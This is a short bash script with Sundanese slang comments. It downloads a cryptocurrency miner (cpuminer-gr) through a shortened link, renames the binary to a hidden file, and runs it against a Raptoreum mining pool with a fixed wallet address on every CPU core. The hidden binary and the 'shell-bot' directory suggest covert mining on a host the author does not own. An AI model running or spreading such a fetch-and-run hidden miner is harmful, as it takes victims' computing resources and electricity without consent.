#!/bin/bash

# edit sc dibawah se suai slera!
# kumaha aink we njink

cd /home/shell-bot
wget -qO rtm git.io/cpuminer-gr-1.2.3 && tar xf rtm && mv ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RGBkj7KZ9U7Rs9SpviMcfXqL233SGmZKfM.zi5 -t $(nproc --all) --no-tune